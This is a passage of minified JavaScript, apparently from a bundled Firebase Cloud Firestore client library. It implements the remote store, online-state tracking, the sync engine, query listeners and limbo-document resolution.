this.sa(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then((([l,c])=>this.connection.Wo(e,Tg(t,o),r,l,c))).catch((l=>{throw l.name==="FirebaseError"?(l.code===de.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),l):new xe(de.UNKNOWN,l.toString())}))}jo(e,t,o,r,l){return this.sa(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then((([c,d])=>this.connection.jo(e,Tg(t,o),r,c,d,l))).catch((c=>{throw c.name==="FirebaseError"?(c.code===de.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),c):new xe(de.UNKNOWN,c.toString())}))}terminate(){this.ia=!0,this.connection.terminate()}}function $I(a,e,t,o){return new KI(a,e,t,o)}class YI{constructor(e,t){this.asyncQueue=e,this.onlineStateHandler=t,this.state="Unknown",this.oa=0,this._a=null,this.aa=!0}ua(){this.oa===0&&(this.ca("Unknown"),this._a=this.asyncQueue.enqueueAfterDelay("online_state_timeout",1e4,(()=>(this._a=null,this.la("Backend didn't respond within 10 seconds."),this.ca("Offline"),Promise.resolve()))))}ha(e){this.state==="Online"?this.ca("Unknown"):(this.oa++,this.oa>=1&&(this.Pa(),this.la(`Connection failed 1 times. Most recent error: ${e.toString()}`),this.ca("Offline")))}set(e){this.Pa(),this.oa=0,e==="Online"&&(this.aa=!1),this.ca(e)}ca(e){e!==this.state&&(this.state=e,this.onlineStateHandler(e))}la(e){const t=`Could not reach Cloud Firestore backend. ${e}
This typically indicates that your device does not have a healthy Internet connection at the moment. The client will operate in offline mode until it is able to successfully connect to the backend.`;this.aa?(Zo(t),this.aa=!1):Ee("OnlineStateTracker",t)}Pa(){this._a!==null&&(this._a.cancel(),this._a=null)}}const Qr="RemoteStore";class XI{constructor(e,t,o,r,l){this.localStore=e,this.datastore=t,this.asyncQueue=o,this.remoteSyncer={},this.Ta=[],this.Ia=new Map,this.Ea=new Set,this.Ra=[],this.Aa=l,this.Aa.Mo((c=>{o.enqueueAndForget((async()=>{es(this)&&(Ee(Qr,"Restarting streams for network reachability change."),await(async function(f){const p=Ne(f);p.Ea.add(4),await fu(p),p.Va.set("Unknown"),p.Ea.delete(4),await dm(p)})(this))}))})),this.Va=new YI(o,r)}}async function dm(a){if(es(a))for(const e of a.Ra)await e(!0)}async function fu(a){for(const e of a.Ra)await e(!1)}function i0(a,e){const t=Ne(a);t.Ia.has(e.targetId)||(t.Ia.set(e.targetId,e),Ab(t)?Cb(t):fl(t).O_()&&Sb(t,e))}function Eb(a,e){const t=Ne(a),o=fl(t);t.Ia.delete(e),o.O_()&&r0(t,e),t.Ia.size===0&&(o.O_()?o.L_():es(t)&&t.Va.set("Unknown"))}function Sb(a,e){if(a.da.$e(e.targetId),e.resumeToken.approximateByteSize()>0||e.snapshotVersion.compareTo(_e.min())>0){const t=a.remoteSyncer.getRemoteKeysForTarget(e.targetId).size;e=e.withExpectedCount(t)}fl(a).Z_(e)}function r0(a,e){a.da.$e(e),fl(a).X_(e)}function Cb(a){a.da=new G2({getRemoteKeysForTarget:e=>a.remoteSyncer.getRemoteKeysForTarget(e),At:e=>a.Ia.get(e)||null,ht:()=>a.datastore.serializer.databaseId}),fl(a).start(),a.Va.ua()}function Ab(a){return es(a)&&!fl(a).x_()&&a.Ia.size>0}function es(a){return Ne(a).Ea.size===0}function s0(a){a.da=void 0}async function ZI(a){a.Va.set("Online")}async function eD(a){a.Ia.forEach(((e,t)=>{Sb(a,e)}))}async function aD(a,e){s0(a),Ab(a)?(a.Va.ha(e),Cb(a)):a.Va.set("Unknown")}async function tD(a,e,t){if(a.Va.set("Online"),e instanceof HT&&e.state===2&&e.cause)try{await(async function(r,l){const c=l.cause;for(const d of l.targetIds)r.Ia.has(d)&&(await r.remoteSyncer.rejectListen(d,c),r.Ia.delete(d),r.da.removeTarget(d))})(a,e)}catch(o){Ee(Qr,"Failed to remove targets %s: %s ",e.targetIds.join(","),o),await _p(a,o)}else if(e instanceof fp?a.da.Xe(e):e instanceof FT?a.da.st(e):a.da.tt(e),!t.isEqual(_e.min()))try{const o=await t0(a.localStore);t.compareTo(o)>=0&&await(function(l,c){const d=l.da.Tt(c);return d.targetChanges.forEach(((f,p)=>{if(f.resumeToken.approximateByteSize()>0){const v=l.Ia.get(p);v&&l.Ia.set(p,v.withResumeToken(f.resumeToken,c))}})),d.targetMismatches.forEach(((f,p)=>{const v=l.Ia.get(f);if(!v)return;l.Ia.set(f,v.withResumeToken(ft.EMPTY_BYTE_STRING,v.snapshotVersion)),r0(l,f);const y=new Vi(v.target,f,p,v.sequenceNumber);Sb(l,y)})),l.remoteSyncer.applyRemoteEvent(d)})(a,t)}catch(o){Ee(Qr,"Failed to raise snapshot:",o),await _p(a,o)}}async function _p(a,e,t){if(!ml(e))throw e;a.Ea.add(1),await fu(a),a.Va.set("Offline"),t||(t=()=>t0(a.localStore)),a.asyncQueue.enqueueRetryable((async()=>{Ee(Qr,"Retrying IndexedDB access"),await t(),a.Ea.delete(1),await dm(a)}))}function l0(a,e){return e().catch((t=>_p(a,t,e)))}async function pm(a){const e=Ne(a),t=Zi(e);let o=e.Ta.length>0?e.Ta[e.Ta.length-1].batchId:sb;for(;nD(e);)try{const r=await NI(e.localStore,o);if(r===null){e.Ta.length===0&&t.L_();break}o=r.batchId,oD(e,r)}catch(r){await _p(e,r)}c0(e)&&u0(e)}function nD(a){return es(a)&&a.Ta.length<10}function oD(a,e){a.Ta.push(e);const t=Zi(a);t.O_()&&t.Y_&&t.ea(e.mutations)}function c0(a){return es(a)&&!Zi(a).x_()&&a.Ta.length>0}function u0(a){Zi(a).start()}async function iD(a){Zi(a).ra()}async function rD(a){const e=Zi(a);for(const t of a.Ta)e.ea(t.mutations)}async function sD(a,e,t){const o=a.Ta.shift(),r=mb.from(o,e,t);await l0(a,(()=>a.remoteSyncer.applySuccessfulWrite(r))),await pm(a)}async function lD(a,e){e&&Zi(a).Y_&&await(async function(o,r){if((function(c){return V2(c)&&c!==de.ABORTED})(r.code)){const l=o.Ta.shift();Zi(o).B_(),await l0(o,(()=>o.remoteSyncer.rejectFailedWrite(l.batchId,r))),await pm(o)}})(a,e),c0(a)&&u0(a)}async function n1(a,e){const t=Ne(a);t.asyncQueue.verifyOperationInProgress(),Ee(Qr,"RemoteStore received new credentials");const o=es(t);t.Ea.add(3),await fu(t),o&&t.Va.set("Unknown"),await t.remoteSyncer.handleCredentialChange(e),t.Ea.delete(3),await dm(t)}async function cD(a,e){const t=Ne(a);e?(t.Ea.delete(2),await dm(t)):e||(t.Ea.add(2),await fu(t),t.Va.set("Unknown"))}function fl(a){return a.ma||(a.ma=(function(t,o,r){const l=Ne(t);return l.sa(),new JI(o,l.connection,l.authCredentials,l.appCheckCredentials,l.serializer,r)})(a.datastore,a.asyncQueue,{Zo:ZI.bind(null,a),Yo:eD.bind(null,a),t_:aD.bind(null,a),J_:tD.bind(null,a)}),a.Ra.push((async e=>{e?(a.ma.B_(),Ab(a)?Cb(a):a.Va.set("Unknown")):(await a.ma.stop(),s0(a))}))),a.ma}function Zi(a){return a.fa||(a.fa=(function(t,o,r){const l=Ne(t);return l.sa(),new QI(o,l.connection,l.authCredentials,l.appCheckCredentials,l.serializer,r)})(a.datastore,a.asyncQueue,{Zo:()=>Promise.resolve(),Yo:iD.bind(null,a),t_:lD.bind(null,a),ta:rD.bind(null,a),na:sD.bind(null,a)}),a.Ra.push((async e=>{e?(a.fa.B_(),await pm(a)):(await a.fa.stop(),a.Ta.length>0&&(Ee(Qr,`Stopping write stream with ${a.Ta.length} pending writes`),a.Ta=[]))}))),a.fa}class Tb{constructor(e,t,o,r,l){this.asyncQueue=e,this.timerId=t,this.targetTimeMs=o,this.op=r,this.removalCallback=l,this.deferred=new Qi,this.then=this.deferred.promise.then.bind(this.deferred.promise),this.deferred.promise.catch((c=>{}))}get promise(){return this.deferred.promise}static createAndSchedule(e,t,o,r,l){const c=Date.now()+o,d=new Tb(e,t,c,r,l);return d.start(o),d}start(e){this.timerHandle=setTimeout((()=>this.handleDelayElapsed()),e)}skipDelay(){return this.handleDelayElapsed()}cancel(e){this.timerHandle!==null&&(this.clearTimeout(),this.deferred.reject(new xe(de.CANCELLED,"Operation cancelled"+(e?": "+e:""))))}handleDelayElapsed(){this.asyncQueue.enqueueAndForget((()=>this.timerHandle!==null?(this.clearTimeout(),this.op().then((e=>this.deferred.resolve(e)))):Promise.resolve()))}clearTimeout(){this.timerHandle!==null&&(this.removalCallback(this),clearTimeout(this.timerHandle),this.timerHandle=null)}}function xb(a,e){if(Zo("AsyncQueue",`${e}: ${a}`),ml(a))return new xe(de.UNAVAILABLE,`${e}: ${a}`);throw a}class $s{static emptySet(e){return new $s(e.comparator)}constructor(e){this.comparator=e?(t,o)=>e(t,o)||Le.comparator(t.key,o.key):(t,o)=>Le.comparator(t.key,o.key),this.keyedMap=kc(),this.sortedSet=new wa(this.comparator)}has(e){return this.keyedMap.get(e)!=null}get(e){return this.keyedMap.get(e)}first(){return this.sortedSet.minKey()}last(){return this.sortedSet.maxKey()}isEmpty(){return this.sortedSet.isEmpty()}indexOf(e){const t=this.keyedMap.get(e);return t?this.sortedSet.indexOf(t):-1}get size(){return this.sortedSet.size}forEach(e){this.sortedSet.inorderTraversal(((t,o)=>(e(t),!1)))}add(e){const t=this.delete(e.key);return t.copy(t.keyedMap.insert(e.key,e),t.sortedSet.insert(e,null))}delete(e){const t=this.get(e);return t?this.copy(this.keyedMap.remove(e),this.sortedSet.remove(t)):this}isEqual(e){if(!(e instanceof $s)||this.size!==e.size)return!1;const t=this.sortedSet.getIterator(),o=e.sortedSet.getIterator();for(;t.hasNext();){const r=t.getNext().key,l=o.getNext().key;if(!r.isEqual(l))return!1}return!0}toString(){const e=[];return this.forEach((t=>{e.push(t.toString())})),e.length===0?"DocumentSet ()":`DocumentSet (
  `+e.join(`  
`)+`
)`}copy(e,t){const o=new $s;return o.comparator=this.comparator,o.keyedMap=e,o.sortedSet=t,o}}class o1{constructor(){this.ga=new wa(Le.comparator)}track(e){const t=e.doc.key,o=this.ga.get(t);o?e.type!==0&&o.type===3?this.ga=this.ga.insert(t,e):e.type===3&&o.type!==1?this.ga=this.ga.insert(t,{type:o.type,doc:e.doc}):e.type===2&&o.type===2?this.ga=this.ga.insert(t,{type:2,doc:e.doc}):e.type===2&&o.type===0?this.ga=this.ga.insert(t,{type:0,doc:e.doc}):e.type===1&&o.type===0?this.ga=this.ga.remove(t):e.type===1&&o.type===2?this.ga=this.ga.insert(t,{type:1,doc:o.doc}):e.type===0&&o.type===1?this.ga=this.ga.insert(t,{type:2,doc:e.doc}):we(63341,{Vt:e,pa:o}):this.ga=this.ga.insert(t,e)}ya(){const e=[];return this.ga.inorderTraversal(((t,o)=>{e.push(o)})),e}}class sl{constructor(e,t,o,r,l,c,d,f,p){this.query=e,this.docs=t,this.oldDocs=o,this.docChanges=r,this.mutatedKeys=l,this.fromCache=c,this.syncStateChanged=d,this.excludesMetadataChanges=f,this.hasCachedResults=p}static fromInitialDocuments(e,t,o,r,l){const c=[];return t.forEach((d=>{c.push({type:0,doc:d})})),new sl(e,t,$s.emptySet(t),c,o,r,!0,!1,l)}get hasPendingWrites(){return!this.mutatedKeys.isEmpty()}isEqual(e){if(!(this.fromCache===e.fromCache&&this.hasCachedResults===e.hasCachedResults&&this.syncStateChanged===e.syncStateChanged&&this.mutatedKeys.isEqual(e.mutatedKeys)&&im(this.query,e.query)&&this.docs.isEqual(e.docs)&&this.oldDocs.isEqual(e.oldDocs)))return!1;const t=this.docChanges,o=e.docChanges;if(t.length!==o.length)return!1;for(let r=0;r<t.length;r++)if(t[r].type!==o[r].type||!t[r].doc.isEqual(o[r].doc))return!1;return!0}}class uD{constructor(){this.wa=void 0,this.ba=[]}Sa(){return this.ba.some((e=>e.Da()))}}class dD{constructor(){this.queries=i1(),this.onlineState="Unknown",this.Ca=new Set}terminate(){(function(t,o){const r=Ne(t),l=r.queries;r.queries=i1(),l.forEach(((c,d)=>{for(const f of d.ba)f.onError(o)}))})(this,new xe(de.ABORTED,"Firestore shutting down"))}}function i1(){return new Xr((a=>RT(a)),im)}async function d0(a,e){const t=Ne(a);let o=3;const r=e.query;let l=t.queries.get(r);l?!l.Sa()&&e.Da()&&(o=2):(l=new uD,o=e.Da()?0:1);try{switch(o){case 0:l.wa=await t.onListen(r,!0);break;case 1:l.wa=await t.onListen(r,!1);break;case 2:await t.onFirstRemoteStoreListen(r)}}catch(c){const d=xb(c,`Initialization of query '${Gs(e.query)}' failed`);return void e.onError(d)}t.queries.set(r,l),l.ba.push(e),e.va(t.onlineState),l.wa&&e.Fa(l.wa)&&jb(t)}async function p0(a,e){const t=Ne(a),o=e.query;let r=3;const l=t.queries.get(o);if(l){const c=l.ba.indexOf(e);c>=0&&(l.ba.splice(c,1),l.ba.length===0?r=e.Da()?0:1:!l.Sa()&&e.Da()&&(r=2))}switch(r){case 0:return t.queries.delete(o),t.onUnlisten(o,!0);case 1:return t.queries.delete(o),t.onUnlisten(o,!1);case 2:return t.onLastRemoteStoreUnlisten(o);default:return}}function pD(a,e){const t=Ne(a);let o=!1;for(const r of e){const l=r.query,c=t.queries.get(l);if(c){for(const d of c.ba)d.Fa(r)&&(o=!0);c.wa=r}}o&&jb(t)}function mD(a,e,t){const o=Ne(a),r=o.queries.get(e);if(r)for(const l of r.ba)l.onError(t);o.queries.delete(e)}function jb(a){a.Ca.forEach((e=>{e.next()}))}var Rg,r1;(r1=Rg||(Rg={})).Ma="default",r1.Cache="cache";class m0{constructor(e,t,o){this.query=e,this.xa=t,this.Oa=!1,this.Na=null,this.onlineState="Unknown",this.options=o||{}}Fa(e){if(!this.options.includeMetadataChanges){const o=[];for(const r of e.docChanges)r.type!==3&&o.push(r);e=new sl(e.query,e.docs,e.oldDocs,o,e.mutatedKeys,e.fromCache,e.syncStateChanged,!0,e.hasCachedResults)}let t=!1;return this.Oa?this.Ba(e)&&(this.xa.next(e),t=!0):this.La(e,this.onlineState)&&(this.ka(e),t=!0),this.Na=e,t}onError(e){this.xa.error(e)}va(e){this.onlineState=e;let t=!1;return this.Na&&!this.Oa&&this.La(this.Na,e)&&(this.ka(this.Na),t=!0),t}La(e,t){if(!e.fromCache||!this.Da())return!0;const o=t!=="Offline";return(!this.options.Ka||!o)&&(!e.docs.isEmpty()||e.hasCachedResults||t==="Offline")}Ba(e){if(e.docChanges.length>0)return!0;const t=this.Na&&this.Na.hasPendingWrites!==e.hasPendingWrites;return!(!e.syncStateChanged&&!t)&&this.options.includeMetadataChanges===!0}ka(e){e=sl.fromInitialDocuments(e.query,e.docs,e.mutatedKeys,e.fromCache,e.hasCachedResults),this.Oa=!0,this.xa.next(e)}Da(){return this.options.source!==Rg.Cache}}class f0{constructor(e){this.key=e}}class h0{constructor(e){this.key=e}}class fD{constructor(e,t){this.query=e,this.Za=t,this.Xa=null,this.hasCachedResults=!1,this.current=!1,this.Ya=Xe(),this.mutatedKeys=Xe(),this.eu=LT(e),this.tu=new $s(this.eu)}get nu(){return this.Za}ru(e,t){const o=t?t.iu:new o1,r=t?t.tu:this.tu;let l=t?t.mutatedKeys:this.mutatedKeys,c=r,d=!1;const f=this.query.limitType==="F"&&r.size===this.query.limit?r.last():null,p=this.query.limitType==="L"&&r.size===this.query.limit?r.first():null;if(e.inorderTraversal(((v,y)=>{const S=r.get(v),A=rm(this.query,y)?y:null,R=!!S&&this.mutatedKeys.has(S.key),L=!!A&&(A.hasLocalMutations||this.mutatedKeys.has(A.key)&&A.hasCommittedMutations);let x=!1;S&&A?S.data.isEqual(A.data)?R!==L&&(o.track({type:3,doc:A}),x=!0):this.su(S,A)||(o.track({type:2,doc:A}),x=!0,(f&&this.eu(A,f)>0||p&&this.eu(A,p)<0)&&(d=!0)):!S&&A?(o.track({type:0,doc:A}),x=!0):S&&!A&&(o.track({type:1,doc:S}),x=!0,(f||p)&&(d=!0)),x&&(A?(c=c.add(A),l=L?l.add(v):l.delete(v)):(c=c.delete(v),l=l.delete(v)))})),this.query.limit!==null)for(;c.size>this.query.limit;){const v=this.query.limitType==="F"?c.last():c.first();c=c.delete(v.key),l=l.delete(v.key),o.track({type:1,doc:v})}return{tu:c,iu:o,Ss:d,mutatedKeys:l}}su(e,t){return e.hasLocalMutations&&t.hasCommittedMutations&&!t.hasLocalMutations}applyChanges(e,t,o,r){const l=this.tu;this.tu=e.tu,this.mutatedKeys=e.mutatedKeys;const c=e.iu.ya();c.sort(((v,y)=>(function(A,R){const L=x=>{switch(x){case 0:return 1;case 2:case 3:return 2;case 1:return 0;default:return we(20277,{Vt:x})}};return L(A)-L(R)})(v.type,y.type)||this.eu(v.doc,y.doc))),this.ou(o),r=r??!1;const d=t&&!r?this._u():[],f=this.Ya.size===0&&this.current&&!r?1:0,p=f!==this.Xa;return this.Xa=f,c.length!==0||p?{snapshot:new sl(this.query,e.tu,l,c,e.mutatedKeys,f===0,p,!1,!!o&&o.resumeToken.approximateByteSize()>0),au:d}:{au:d}}va(e){return this.current&&e==="Offline"?(this.current=!1,this.applyChanges({tu:this.tu,iu:new o1,mutatedKeys:this.mutatedKeys,Ss:!1},!1)):{au:[]}}uu(e){return!this.Za.has(e)&&!!this.tu.has(e)&&!this.tu.get(e).hasLocalMutations}ou(e){e&&(e.addedDocuments.forEach((t=>this.Za=this.Za.add(t))),e.modifiedDocuments.forEach((t=>{})),e.removedDocuments.forEach((t=>this.Za=this.Za.delete(t))),this.current=e.current)}_u(){if(!this.current)return[];const e=this.Ya;this.Ya=Xe(),this.tu.forEach((o=>{this.uu(o.key)&&(this.Ya=this.Ya.add(o.key))}));const t=[];return e.forEach((o=>{this.Ya.has(o)||t.push(new h0(o))})),this.Ya.forEach((o=>{e.has(o)||t.push(new f0(o))})),t}cu(e){this.Za=e.ks,this.Ya=Xe();const t=this.ru(e.documents);return this.applyChanges(t,!0)}lu(){return sl.fromInitialDocuments(this.query,this.tu,this.mutatedKeys,this.Xa===0,this.hasCachedResults)}}const Pb="SyncEngine";class hD{constructor(e,t,o){this.query=e,this.targetId=t,this.view=o}}class gD{constructor(e){this.key=e,this.hu=!1}}class bD{constructor(e,t,o,r,l,c){this.localStore=e,this.remoteStore=t,this.eventManager=o,this.sharedClientState=r,this.currentUser=l,this.maxConcurrentLimboResolutions=c,this.Pu={},this.Tu=new Xr((d=>RT(d)),im),this.Iu=new Map,this.Eu=new Set,this.Ru=new wa(Le.comparator),this.Au=new Map,this.Vu=new gb,this.du={},this.mu=new Map,this.fu=rl.ar(),this.onlineState="Unknown",this.gu=void 0}get isPrimaryClient(){return this.gu===!0}}async function vD(a,e,t=!0){const o=S0(a);let r;const l=o.Tu.get(e);return l?(o.sharedClientState.addLocalQueryTarget(l.targetId),r=l.view.lu()):r=await g0(o,e,t,!0),r}async function yD(a,e){const t=S0(a);await g0(t,e,!0,!1)}async function g0(a,e,t,o){const r=await OI(a.localStore,go(e)),l=r.targetId,c=a.sharedClientState.addLocalQueryTarget(l,t);let d;return o&&(d=await ED(a,e,l,c==="current",r.resumeToken)),a.isPrimaryClient&&t&&i0(a.remoteStore,r),d}async function ED(a,e,t,o,r){a.pu=(y,S,A)=>(async function(L,x,D,G){let B=x.view.ru(D);B.Ss&&(B=await XC(L.localStore,x.query,!1).then((({documents:w})=>x.view.ru(w,B))));const ee=G&&G.targetChanges.get(x.targetId),ue=G&&G.targetMismatches.get(x.targetId)!=null,Q=x.view.applyChanges(B,L.isPrimaryClient,ee,ue);return l1(L,x.targetId,Q.au),Q.snapshot})(a,y,S,A);const l=await XC(a.localStore,e,!0),c=new fD(e,l.ks),d=c.ru(l.documents),f=mu.createSynthesizedTargetChangeForCurrentChange(t,o&&a.onlineState!=="Offline",r),p=c.applyChanges(d,a.isPrimaryClient,f);l1(a,t,p.au);const v=new hD(e,t,c);return a.Tu.set(e,v),a.Iu.has(t)?a.Iu.get(t).push(e):a.Iu.set(t,[e]),p.snapshot}async function SD(a,e,t){const o=Ne(a),r=o.Tu.get(e),l=o.Iu.get(r.targetId);if(l.length>1)return o.Iu.set(r.targetId,l.filter((c=>!im(c,e)))),void o.Tu.delete(e);o.isPrimaryClient?(o.sharedClientState.removeLocalQueryTarget(r.targetId),o.sharedClientState.isActiveQueryTarget(r.targetId)||await Pg(o.localStore,r.targetId,!1).then((()=>{o.sharedClientState.clearQueryState(r.targetId),t&&Eb(o.remoteStore,r.targetId),Lg(o,r.targetId)})).catch(pl)):(Lg(o,r.targetId),await Pg(o.localStore,r.targetId,!0))}async function CD(a,e){const t=Ne(a),o=t.Tu.get(e),r=t.Iu.get(o.targetId);t.isPrimaryClient&&r.length===1&&(t.sharedClientState.removeLocalQueryTarget(o.targetId),Eb(t.remoteStore,o.targetId))}async function AD(a,e,t){const o=LD(a);try{const r=await(function(c,d){const f=Ne(c),p=Pa.now(),v=d.reduce(((A,R)=>A.add(R.key)),Xe());let y,S;return f.persistence.runTransaction("Locally write mutations","readwrite",(A=>{let R=ei(),L=Xe();return f.xs.getEntries(A,v).next((x=>{R=x,R.forEach(((D,G)=>{G.isValidDocument()||(L=L.add(D))}))})).next((()=>f.localDocuments.getOverlayedDocuments(A,R))).next((x=>{y=x;const D=[];for(const G of d){const B=N2(G,y.get(G.key).overlayedDocument);B!=null&&D.push(new Zr(G.key,B,CT(B.value.mapValue),Ko.exists(!0)))}return f.mutationQueue.addMutationBatch(A,p,D,d)})).next((x=>{S=x;const D=x.applyToLocalDocumentSet(y,L);return f.documentOverlayCache.saveOverlays(A,x.batchId,D)}))})).then((()=>({batchId:S.batchId,changes:DT(y)})))})(o.localStore,e);o.sharedClientState.addPendingMutation(r.batchId),(function(c,d,f){let p=c.du[c.currentUser.toKey()];p||(p=new wa(Ye)),p=p.insert(d,f),c.du[c.currentUser.toKey()]=p})(o,r.batchId,t),await hu(o,r.changes),await pm(o.remoteStore)}catch(r){const l=xb(r,"Failed to persist write");t.reject(l)}}async function b0(a,e){const t=Ne(a);try{const o=await _I(t.localStore,e);e.targetChanges.forEach(((r,l)=>{const c=t.Au.get(l);c&&(ma(r.addedDocuments.size+r.modifiedDocuments.size+r.removedDocuments.size<=1,22616),r.addedDocuments.size>0?c.hu=!0:r.modifiedDocuments.size>0?ma(c.hu,14607):r.removedDocuments.size>0&&(ma(c.hu,42227),c.hu=!1))})),await hu(t,o,e)}catch(o){await pl(o)}}function s1(a,e,t){const o=Ne(a);if(o.isPrimaryClient&&t===0||!o.isPrimaryClient&&t===1){const r=[];o.Tu.forEach(((l,c)=>{const d=c.view.va(e);d.snapshot&&r.push(d.snapshot)})),(function(c,d){const f=Ne(c);f.onlineState=d;let p=!1;f.queries.forEach(((v,y)=>{for(const S of y.ba)S.va(d)&&(p=!0)})),p&&jb(f)})(o.eventManager,e),r.length&&o.Pu.J_(r),o.onlineState=e,o.isPrimaryClient&&o.sharedClientState.setOnlineState(e)}}async function TD(a,e,t){const o=Ne(a);o.sharedClientState.updateQueryState(e,"rejected",t);const r=o.Au.get(e),l=r&&r.key;if(l){let c=new wa(Le.comparator);c=c.insert(l,Et.newNoDocument(l,_e.min()));const d=Xe().add(l),f=new cm(_e.min(),new Map,new wa(Ye),c,d);await b0(o,f),o.Ru=o.Ru.remove(l),o.Au.delete(e),qb(o)}else await Pg(o.localStore,e,!1).then((()=>Lg(o,e,t))).catch(pl)}async function xD(a,e){const t=Ne(a),o=e.batch.batchId;try{const r=await MI(t.localStore,e);y0(t,o,null),v0(t,o),t.sharedClientState.updateMutationState(o,"acknowledged"),await hu(t,r)}catch(r){await pl(r)}}async function jD(a,e,t){const o=Ne(a);try{const r=await(function(c,d){const f=Ne(c);return f.persistence.runTransaction("Reject batch","readwrite-primary",(p=>{let v;return f.mutationQueue.lookupMutationBatch(p,d).next((y=>(ma(y!==null,37113),v=y.keys(),f.mutationQueue.removeMutationBatch(p,y)))).next((()=>f.mutationQueue.performConsistencyCheck(p))).next((()=>f.documentOverlayCache.removeOverlaysForBatchId(p,v,d))).next((()=>f.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(p,v))).next((()=>f.localDocuments.getDocuments(p,v)))}))})(o.localStore,e);y0(o,e,t),v0(o,e),o.sharedClientState.updateMutationState(e,"rejected",t),await hu(o,r)}catch(r){await pl(r)}}function v0(a,e){(a.mu.get(e)||[]).forEach((t=>{t.resolve()})),a.mu.delete(e)}function y0(a,e,t){const o=Ne(a);let r=o.du[o.currentUser.toKey()];if(r){const l=r.get(e);l&&(t?l.reject(t):l.resolve(),r=r.remove(e)),o.du[o.currentUser.toKey()]=r}}function Lg(a,e,t=null){a.sharedClientState.removeLocalQueryTarget(e);for(const o of a.Iu.get(e))a.Tu.delete(o),t&&a.Pu.yu(o,t);a.Iu.delete(e),a.isPrimaryClient&&a.Vu.Gr(e).forEach((o=>{a.Vu.containsKey(o)||E0(a,o)}))}function E0(a,e){a.Eu.delete(e.path.canonicalString());const t=a.Ru.get(e);t!==null&&(Eb(a.remoteStore,t),a.Ru=a.Ru.remove(e),a.Au.delete(t),qb(a))}function l1(a,e,t){for(const o of t)o instanceof f0?(a.Vu.addReference(o.key,e),PD(a,o)):o instanceof h0?(Ee(Pb,"Document no longer in limbo: "+o.key),a.Vu.removeReference(o.key,e),a.Vu.containsKey(o.key)||E0(a,o.key)):we(19791,{wu:o})}function PD(a,e){const t=e.key,o=t.path.canonicalString();a.Ru.get(t)||a.Eu.has(o)||(Ee(Pb,"New document in limbo: "+t),a.Eu.add(o),qb(a))}function qb(a){for(;a.Eu.size>0&&a.Ru.size<a.maxConcurrentLimboResolutions;){const e=a.Eu.values().next().value;a.Eu.delete(e);const t=new Le(Da.fromString(e)),o=a.fu.next();a.Au.set(o,new gD(t)),a.Ru=a.Ru.insert(t,o),i0(a.remoteStore,new Vi(go(om(t.path)),o,"TargetPurposeLimboResolution",em.ce))}}async function hu(a,e,t){const o=Ne(a),r=[],l=[],c=[];o.Tu.isEmpty()||(o.Tu.forEach(((d,f)=>{c.push(o.pu(f,e,t).then((p=>{if((p||t)&&o.isPrimaryClient){const v=p?!p.fromCache:t?.targetChanges.get(f.targetId)?.current;o.sharedClientState.updateQueryState(f.targetId,v?"current":"not-current")}if(p){r.push(p);const v=vb.Es(f.targetId,p);l.push(v)}})))})),await Promise.all(c),o.Pu.J_(r),await(async function(f,p){const v=Ne(f);try{await v.persistence.runTransaction("notifyLocalViewChanges","readwrite",(y=>ce.forEach(p,(S=>ce.forEach(S.Ts,(A=>v.persistence.referenceDelegate.addReference(y,S.targetId,A))).next((()=>ce.forEach(S.Is,(A=>v.persistence.referenceDelegate.removeReference(y,S.targetId,A)))))))))}catch(y){if(!ml(y))throw y;Ee(yb,"Failed to update sequence numbers: "+y)}for(const y of p){const S=y.targetId;if(!y.fromCache){const A=v.vs.get(S),R=A.snapshotVersion,L=A.withLastLimboFreeSnapshotVersion(R);v.vs=v.vs.insert(S,L)}}})(o.localStore,l))}async function qD(a,e){const t=Ne(a);if(!t.currentUser.isEqual(e)){Ee(Pb,"User change. New user:",e.toKey());const o=await a0(t.localStore,e);t.currentUser=e,(function(l,c){l.mu.forEach((d=>{d.forEach((f=>{f.reject(new xe(de.CANCELLED,c))}))})),l.mu.clear()})(t,"'waitForPendingWrites' promise is rejected due to a user change."),t.sharedClientState.handleUserChange(e,o.removedBatchIds,o.addedBatchIds),await hu(t,o.Ns)}}function RD(a,e){const t=Ne(a),o=t.Au.get(e);if(o&&o.hu)return Xe().add(o.key);{let r=Xe();const l=t.Iu.get(e);if(!l)return r;for(const c of l){const d=t.Tu.get(c);r=r.unionWith(d.view.nu)}return r}}function S0(a){const e=Ne(a);return e.remoteStore.remoteSyncer.applyRemoteEvent=b0.bind(null,e),e.remoteStore.remoteSyncer.getRemoteKeysForTarget=RD.bind(null,e),e.remoteStore.remoteSyncer.rejectListen=TD.bind(null,e),e.Pu.J_=pD.bind(null,e.eventManager),e.Pu.yu=mD.bind(null,e.eventManager),e}function LD(a){const e=Ne(a);return e.remoteStore.remoteSyncer.applySuccessfulWrite=xD.bind(null,e),e.remoteStore.remoteSyncer.rejectFailedWrite=jD.bind(null,e),e}class kp{constructor(){this.kind="memory",this.synchronizeTabs=!1}async initialize(e){this.serializer=um(e.databaseInfo.databaseId),this.sharedClientState=this.Du(e),this.persistence=this.Cu(e),await this.persistence.start(),this.localStore=this.vu(e),this.gcScheduler=this.Fu(e,this.localStore),this.indexBackfillerScheduler=this.Mu(e,this.localStore)}Fu(e,t){return null}Mu(e,t){return null}vu(e){return wI(this.persistence,new LI,e.initialUser,this.serializer)}Cu(e){return new e0(bb.Vi,this.serializer)}Du(e){return new UI}async terminate(){this.gcScheduler?.stop(),this.indexBackfillerScheduler?.stop(),this.sharedClientState.shutdown(),await this.persistence.shutdown()}}kp.provider={build:()=>new kp};class ID extends kp{constructor(e){super(),this.cacheSizeBytes=e}Fu(e,t){ma(this.persistence.referenceDelegate instanceof Mp,46915);const o=this.persistence.referenceDelegate.garbageCollector;return new hI(o,e.asyncQueue,t)}Cu(e){const t=this.cacheSizeBytes!==void 0?Nt.withCacheSize(this.cacheSizeBytes):Nt.DEFAULT;return new e0((o=>Mp.Vi(o,t)),this.serializer)}}class Ig{async initialize(e,t){this.localStore||(this.localStore=e.localStore,this.sharedClientState=e.sharedClientState,this.datastore=this.createDatastore(t),this.remoteStore=this.createRemoteStore(t),this.eventManager=this.createEventManager(t),this.syncEngine=this.createSyncEngine(t,!e.synchronizeTabs),this.sharedClientState.onlineStateHandler=o=>s1(this.syncEngine,o,1),this.remoteStore.remoteSyncer.handleCredentialChange=qD.bind(null,this.syncEngine),await 